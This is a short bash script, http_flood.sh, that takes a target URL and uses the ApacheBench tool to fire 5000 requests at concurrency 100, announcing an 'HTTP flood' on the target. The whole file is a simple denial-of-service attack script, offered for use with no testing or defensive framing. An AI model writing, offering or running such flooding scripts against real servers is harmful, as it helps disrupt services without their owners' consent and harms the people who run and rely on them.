#!/bin/bash

TARGET_URL=$1

if [ -z "$TARGET_URL" ]; then
  echo "Usage: ./http_flood.sh http://<target_ip>/"
  exit 1
fi

echo "Starting HTTP flood on $TARGET_URL"
ab -n 5000 -c 100 $TARGET_URL
